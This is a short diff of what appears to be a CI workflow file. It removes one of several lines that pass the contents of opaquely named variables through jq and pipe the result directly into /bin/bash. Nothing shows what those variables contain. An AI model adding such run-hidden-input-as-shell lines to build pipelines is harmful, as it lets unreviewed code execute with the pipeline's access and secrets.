@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$wvp2087" | jq -r .fia69681 | /bin/bash
           printf '%s' "$lmjtp60" | jq -r .mi35 | /bin/bash
           printf '%s' "$veg0071" | jq -r .d04917 | /bin/bash
-          echo $uwfip7729 | jq -r .q7694 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
